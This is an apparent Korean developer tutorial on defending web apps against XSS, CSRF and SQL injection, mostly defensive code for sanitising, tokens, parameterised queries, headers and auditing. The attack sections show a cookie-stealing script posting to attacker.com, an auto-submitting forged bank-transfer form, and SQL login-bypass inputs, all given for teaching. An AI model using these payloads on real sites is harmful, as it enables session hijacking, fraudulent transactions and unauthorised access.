---
title: 웹 보안 기초: XSS, CSRF, SQL Injection 실전 방어 가이드
date: 2026-03-28
summary: 웹 개발자라면 반드시 알아야 할 XSS, CSRF, SQL Injection의 공격 원리와 방어 방법을 실전 코드로 정리합니다. OWASP Top 10 기반으로 취약점별 대응 전략을 다룹니다.
tags: [Security, XSS, CSRF, SQLInjection, OWASP, Web]
---

웹 보안 취약점은 사용자 데이터 유출, 서비스 장애, 법적 책임으로 이어집니다. OWASP(Open Web Application Security Project)는 매년 가장 위험한 웹 취약점 Top 10을 발표하며, 이 중 XSS, CSRF, SQL Injection은 오랫동안 목록에 오른 대표적인 공격 유형입니다. 공격 원리를 이해해야 효과적으로 방어할 수 있습니다.

> 목표: XSS, CSRF, SQL Injection의 공격 메커니즘을 이해하고, 각 취약점에 대한 올바른 방어 코드를 작성할 수 있다.

## 목차

1. [OWASP Top 10 개요](#1-owasp-top-10-개요)
2. [XSS (Cross-Site Scripting)](#2-xss-cross-site-scripting)
3. [CSRF (Cross-Site Request Forgery)](#3-csrf-cross-site-request-forgery)
4. [SQL Injection](#4-sql-injection)
5. [인증과 세션 보안](#5-인증과-세션-보안)
6. [민감 데이터 노출 방지](#6-민감-데이터-노출-방지)
7. [보안 HTTP 헤더](#7-보안-http-헤더)
8. [의존성 보안과 공급망 공격](#8-의존성-보안과-공급망-공격)
9. [보안 테스트 도구](#9-보안-테스트-도구)
10. [보안 체크리스트](#10-보안-체크리스트)

---

## 1. OWASP Top 10 개요

2021년 기준 OWASP Top 10입니다.

| 순위 | 취약점 | 설명 |
|------|--------|------|
| A01 | 접근 제어 취약점 | 권한 없는 리소스 접근 |
| A02 | 암호화 실패 | 민감 데이터 평문 전송/저장 |
| A03 | **인젝션** | SQL, OS, LDAP 인젝션 |
| A04 | 안전하지 않은 설계 | 보안 설계 원칙 부재 |
| A05 | 보안 구성 오류 | 기본 설정, 불필요한 기능 활성화 |
| A06 | 취약하고 오래된 구성 요소 | 패치되지 않은 라이브러리 |
| A07 | 식별 및 인증 실패 | 약한 인증, 세션 관리 |
| A08 | 소프트웨어/데이터 무결성 실패 | CI/CD 파이프라인 보안 |
| A09 | 보안 로깅/모니터링 실패 | 공격 감지 불가 |
| A10 | 서버측 요청 위조 (SSRF) | 서버를 통한 내부망 접근 |

---

## 2. XSS (Cross-Site Scripting)

공격자가 악성 스크립트를 웹 페이지에 삽입해 피해자의 브라우저에서 실행시키는 공격입니다.

### XSS 유형

| 유형 | 설명 | 저장 여부 |
|------|------|-----------|
| **Stored XSS** | DB에 악성 코드 저장, 다른 사용자에게 실행 | 지속적 |
| **Reflected XSS** | URL 파라미터에 악성 코드, 즉시 반사 | 일회성 |
| **DOM-based XSS** | 클라이언트 JS가 DOM을 unsafe하게 조작 | 일회성 |

### 공격 예시

```html
<!-- 공격자가 댓글에 삽입하는 코드 -->
<script>
  // 세션 쿠키 탈취
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>

<!-- URL 파라미터를 통한 Reflected XSS -->
<!-- https://example.com/search?q=<script>alert('XSS')</script> -->
```

### 방어: 출력 인코딩 (Output Encoding)

```js
// Bad — 사용자 입력을 innerHTML에 직접 삽입
element.innerHTML = userInput;
document.write(userInput);

// Good — textContent 사용 (자동 이스케이프)
element.textContent = userInput;

// Good — 직접 인코딩
function escapeHtml(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;');
}
element.innerHTML = escapeHtml(userInput);
```

### 방어: DOMPurify로 HTML 새니타이징

```bash
npm install dompurify
```

```tsx
import DOMPurify from 'dompurify';

// 마크다운 렌더링 등 HTML 입력이 필요한 경우
function RichContent({ html }: { html: string }) {
  const clean = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['p', 'b', 'i', 'em', 'strong', 'a', 'ul', 'ol', 'li'],
    ALLOWED_ATTR: ['href', 'title'],
    ALLOW_DATA_ATTR: false,
  });

  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}
```

### 방어: Content Security Policy (CSP)

```http
# HTTP 헤더로 설정
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{random}'; style-src 'self'; img-src 'self' data: https:; object-src 'none';
```

```tsx
// Next.js — next.config.ts
const nextConfig = {
  async headers() {
    return [
      {
        source: '/(.*)',
        headers: [
          {
            key: 'Content-Security-Policy',
            value: [
              "default-src 'self'",
              "script-src 'self' 'unsafe-inline'", // nonce 방식 권장
              "style-src 'self' 'unsafe-inline'",
              "img-src 'self' data: https:",
              "object-src 'none'",
              "frame-ancestors 'none'",
            ].join('; '),
          },
        ],
      },
    ];
  },
};
```

---

## 3. CSRF (Cross-Site Request Forgery)

인증된 사용자의 권한으로 의도치 않은 요청을 서버에 전송하는 공격입니다.

### 공격 원리

```html
<!-- 공격자 사이트에 숨겨진 폼 -->
<!-- 피해자가 이 페이지를 방문하면 자동으로 은행 이체 요청이 전송됨 -->
<form action="https://bank.com/transfer" method="POST" id="csrf-form">
  <input type="hidden" name="to" value="attacker-account" />
  <input type="hidden" name="amount" value="1000000" />
</form>
<script>document.getElementById('csrf-form').submit();</script>

<!-- 또는 이미지 태그를 이용한 GET 요청 공격 -->
<img src="https://bank.com/transfer?to=attacker&amount=1000000" />
```

### 방어 1: CSRF 토큰

```ts
// 서버: 토큰 생성
import crypto from 'crypto';

function generateCsrfToken(): string {
  return crypto.randomBytes(32).toString('hex');
}

// 세션에 저장
app.use((req, res, next) => {
  if (!req.session.csrfToken) {
    req.session.csrfToken = generateCsrfToken();
  }
  next();
});

// 폼에 포함
app.get('/transfer', (req, res) => {
  res.render('transfer', { csrfToken: req.session.csrfToken });
});

// 검증
app.post('/transfer', (req, res) => {
  if (req.body._csrf !== req.session.csrfToken) {
    return res.status(403).json({ error: 'CSRF 토큰 검증 실패' });
  }
  // 이체 처리
});
```

```html
<!-- 클라이언트 폼에 숨겨진 필드 -->
<form method="POST" action="/transfer">
  <input type="hidden" name="_csrf" value="{{csrfToken}}" />
  <input type="number" name="amount" />
  <button type="submit">이체</button>
</form>
```

### 방어 2: SameSite 쿠키 속성

```ts
// 세션 쿠키에 SameSite 설정
res.cookie('session', token, {
  httpOnly: true,      // JS에서 접근 불가
  secure: true,        // HTTPS에서만 전송
  sameSite: 'strict',  // 같은 사이트에서만 전송 (Strict)
  // sameSite: 'lax',  // 최소한의 cross-site 허용
  maxAge: 3600000,
});
```

| SameSite 값 | 설명 | CSRF 방어 수준 |
|-------------|------|----------------|
| `Strict` | 동일 사이트 요청에만 쿠키 전송 | 완전 방어 |
| `Lax` | 안전한 GET 요청에는 허용 | 대부분 방어 |
| `None` | 모든 요청에 쿠키 전송 (Secure 필수) | 방어 없음 |

### 방어 3: Origin/Referer 헤더 검증

```ts
app.use((req, res, next) => {
  if (['POST', 'PUT', 'DELETE', 'PATCH'].includes(req.method)) {
    const origin = req.headers.origin || req.headers.referer;
    const allowedOrigins = ['https://myapp.com', 'https://www.myapp.com'];

    if (!origin || !allowedOrigins.some(o => origin.startsWith(o))) {
      return res.status(403).json({ error: '허용되지 않은 Origin' });
    }
  }
  next();
});
```

---

## 4. SQL Injection

악의적인 SQL 코드를 입력값에 삽입해 데이터베이스를 조작하는 공격입니다.

### 공격 예시

```sql
-- 취약한 코드 (문자열 직접 연결)
SELECT * FROM users WHERE username = '${username}' AND password = '${password}'

-- 공격자가 username에 입력: admin'--
-- 실행되는 쿼리:
SELECT * FROM users WHERE username = 'admin'--' AND password = '아무거나'
-- '--' 이후는 주석 처리 → 비밀번호 검증 우회

-- username에 입력: ' OR '1'='1
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = ''
-- 항상 true → 모든 레코드 반환
```

### 방어 1: Prepared Statements (파라미터 바인딩)

```ts
// Bad — 문자열 연결
const query = `SELECT * FROM users WHERE email = '${email}'`;
await db.query(query);

// Good — Parameterized Query
const query = 'SELECT * FROM users WHERE email = $1';
await db.query(query, [email]);

// node-postgres 예시
import { Pool } from 'pg';
const pool = new Pool();

async function getUserByEmail(email: string) {
  // 파라미터는 $1, $2, ... 로 바인딩 — 이스케이프 자동 처리
  const result = await pool.query(
    'SELECT id, name, email FROM users WHERE email = $1 AND active = $2',
    [email, true]
  );
  return result.rows[0];
}
```

### 방어 2: ORM 사용 (Prisma)

```ts
import { PrismaClient } from '@prisma/client';
const prisma = new PrismaClient();

// Prisma는 자동으로 파라미터 바인딩 — SQL Injection 원천 차단
async function getUser(email: string) {
  return prisma.user.findUnique({
    where: { email }, // 절대 SQL 문자열 직접 조작 없음
    select: { id: true, name: true, email: true },
  });
}

// 주의: raw query를 쓸 때는 Prisma.$queryRaw 태그드 리터럴 사용
async function searchUsers(name: string) {
  // Bad
  // return prisma.$queryRawUnsafe(`SELECT * FROM users WHERE name = '${name}'`);

  // Good — 자동 파라미터 바인딩
  return prisma.$queryRaw`SELECT * FROM users WHERE name = ${name}`;
}
```

### 방어 3: 입력값 검증

```ts
import { z } from 'zod';

const loginSchema = z.object({
  email: z.string().email().max(255),
  password: z.string().min(8).max(128),
});

app.post('/login', async (req, res) => {
  const result = loginSchema.safeParse(req.body);
  if (!result.success) {
    return res.status(400).json({ error: '잘못된 입력값' });
  }
  const { email, password } = result.data;
  // 검증된 값만 사용
});
```

---

## 5. 인증과 세션 보안

### 안전한 비밀번호 해싱 (bcrypt)

```ts
import bcrypt from 'bcrypt';

const SALT_ROUNDS = 12;

// 비밀번호 저장
async function hashPassword(plaintext: string): Promise<string> {
  return bcrypt.hash(plaintext, SALT_ROUNDS);
}

// 비밀번호 검증 (타이밍 어택 방지 — 상수 시간 비교)
async function verifyPassword(plaintext: string, hash: string): Promise<boolean> {
  return bcrypt.compare(plaintext, hash);
}

// 절대 하지 말 것:
// - MD5, SHA1으로 비밀번호 해싱
// - 레인보우 테이블 공격에 취약
```

### JWT 보안

```ts
import jwt from 'jsonwebtoken';

// Bad — 약한 시크릿, 만료 없음
const token = jwt.sign({ userId: 1 }, 'secret');

// Good — 강한 시크릿, 만료, 알고리즘 명시
const token = jwt.sign(
  { userId: user.id, role: user.role },
  process.env.JWT_SECRET!, // 최소 256비트 랜덤 문자열
  {
    algorithm: 'HS256',
    expiresIn: '15m',       // 짧은 만료 시간
    issuer: 'myapp.com',
    audience: 'myapp-client',
  }
);

// 검증
function verifyToken(token: string) {
  try {
    return jwt.verify(token, process.env.JWT_SECRET!, {
      algorithms: ['HS256'], // 허용 알고리즘 명시 (none 알고리즘 공격 방지)
      issuer: 'myapp.com',
    });
  } catch {
    return null;
  }
}
```

### Rate Limiting — 브루트 포스 방어

```bash
npm install express-rate-limit
```

```ts
import rateLimit from 'express-rate-limit';

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15분
  max: 5,                    // 최대 5회 시도
  message: { error: '로그인 시도가 너무 많습니다. 15분 후 다시 시도해주세요.' },
  standardHeaders: true,
  legacyHeaders: false,
  skipSuccessfulRequests: true, // 성공 시 카운트 제외
});

app.post('/login', loginLimiter, loginHandler);
```

---

## 6. 민감 데이터 노출 방지

### 환경 변수 관리

```bash
# .env (절대 git에 커밋 금지)
DATABASE_URL=postgresql://user:password@localhost:5432/mydb
JWT_SECRET=your-very-long-random-secret-key-here
API_KEY=sk-...
```

```bash
# .gitignore
.env
.env.local
.env.*.local
*.pem
*.key
```

### API 응답에서 민감 데이터 제외

```ts
// Bad — 전체 사용자 객체 반환 (비밀번호 해시 포함)
app.get('/api/me', (req, res) => {
  res.json(req.user); // { id, email, passwordHash, ... }
});

// Good — 필요한 필드만 선택 반환
app.get('/api/me', (req, res) => {
  const { id, email, name, role, createdAt } = req.user;
  res.json({ id, email, name, role, createdAt });
});

// Prisma에서 비밀번호 필드 제외
const user = await prisma.user.findUnique({
  where: { id },
  select: {
    id: true,
    email: true,
    name: true,
    // passwordHash: false — 기본적으로 select에서 누락하면 제외됨
  },
});
```

---

## 7. 보안 HTTP 헤더

```ts
// helmet.js로 보안 헤더 자동 설정
import helmet from 'helmet';

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", 'data:', 'https:'],
      objectSrc: ["'none'"],
      frameAncestors: ["'none'"],
    },
  },
  hsts: {
    maxAge: 31536000,    // 1년
    includeSubDomains: true,
    preload: true,
  },
  referrerPolicy: { policy: 'strict-origin-when-cross-origin' },
  permissionsPolicy: {
    features: {
      camera: [],
      microphone: [],
      geolocation: [],
    },
  },
}));
```

### 핵심 보안 헤더 정리

| 헤더 | 역할 |
|------|------|
| `X-Frame-Options: DENY` | 클릭재킹 방지 |
| `X-Content-Type-Options: nosniff` | MIME 스니핑 방지 |
| `Strict-Transport-Security` | HTTPS 강제 (HSTS) |
| `Content-Security-Policy` | XSS/인젝션 방지 |
| `Referrer-Policy` | Referrer 정보 제한 |
| `Permissions-Policy` | 브라우저 기능 제한 |

---

## 8. 의존성 보안과 공급망 공격

```bash
# npm 취약점 감사
npm audit

# 자동 수정 가능한 취약점 패치
npm audit fix

# 강제 패치 (breaking changes 주의)
npm audit fix --force

# 특정 패키지 취약점 확인
npx better-npm-audit audit
```

### GitHub Dependabot 설정

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: npm
    directory: /
    schedule:
      interval: weekly
    open-pull-requests-limit: 10
    groups:
      dev-dependencies:
        dependency-type: development
```

### 서브리소스 무결성 (SRI)

```html
<!-- CDN 파일이 변조되지 않았는지 검증 -->
<script
  src="https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js"
  integrity="sha256-qXBd/EfAdjOA2FGrGAG+b3YBn2tn5A6bhz+LSgYD96k="
  crossorigin="anonymous"
></script>
```

---

## 9. 보안 테스트 도구

| 도구 | 유형 | 용도 |
|------|------|------|
| **OWASP ZAP** | DAST | 실행 중인 앱 스캔 |
| **Burp Suite** | DAST | 웹 프록시, 수동 테스트 |
| **Semgrep** | SAST | 정적 코드 분석 |
| **Snyk** | SCA | 의존성 취약점 |
| **npm audit** | SCA | npm 패키지 감사 |
| **Lighthouse** | 자동화 | 보안 헤더 검사 |

### CI에 보안 스캔 통합

```yaml
# .github/workflows/security.yml
name: Security Scan

on: [push, pull_request]

jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version: '20' }
      - run: npm ci
      - run: npm audit --audit-level=high  # high 이상 취약점 시 실패

  semgrep:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: returntocorp/semgrep-action@v1
        with:
          config: p/javascript p/typescript p/security-audit
```

---

## 10. 보안 체크리스트

### 입력/출력

- [ ] 모든 사용자 입력을 서버에서 검증 (Zod, Joi 등)
- [ ] HTML 출력 시 이스케이프 또는 DOMPurify 사용
- [ ] SQL 쿼리는 Prepared Statement 또는 ORM 사용
- [ ] 파일 업로드 시 MIME 타입 + 확장자 검증

### 인증/인가

- [ ] 비밀번호는 bcrypt/Argon2로 해싱 (최소 12 라운드)
- [ ] JWT 짧은 만료 시간 + Refresh Token 전략
- [ ] 쿠키에 HttpOnly, Secure, SameSite=Strict 설정
- [ ] 로그인 시도 Rate Limiting 적용
- [ ] 2단계 인증(2FA) 지원

### 통신/헤더

- [ ] 모든 통신 HTTPS 강제 (HSTS)
- [ ] CSP, X-Frame-Options 등 보안 헤더 설정 (helmet.js)
- [ ] CORS 허용 출처 명시적으로 제한
- [ ] CSRF 토큰 또는 SameSite 쿠키로 방어

### 데이터

- [ ] 민감 정보는 환경 변수로 관리 (.env를 .gitignore에 추가)
- [ ] API 응답에서 민감 필드 제거
- [ ] 로그에 비밀번호, 카드번호 등 민감 정보 기록 금지
- [ ] 데이터베이스 최소 권한 원칙 적용

### 유지보수

- [ ] npm audit 주기적 실행 (CI에 통합)
- [ ] Dependabot 또는 Renovate로 의존성 자동 업데이트
- [ ] 보안 사고 대응 절차(Incident Response) 문서화
- [ ] 정기적인 침투 테스트 또는 보안 리뷰

---

웹 보안은 한 번 설정하고 끝나는 것이 아닙니다. **보안을 개발 프로세스에 내재화**하는 것이 핵심입니다. 입력값 검증, Prepared Statement, 보안 헤더, 강력한 인증이라는 네 가지 기둥을 지키면 대부분의 일반적인 공격을 방어할 수 있습니다. `npm audit`를 CI에 통합해 새 취약점이 배포되기 전에 감지하세요.
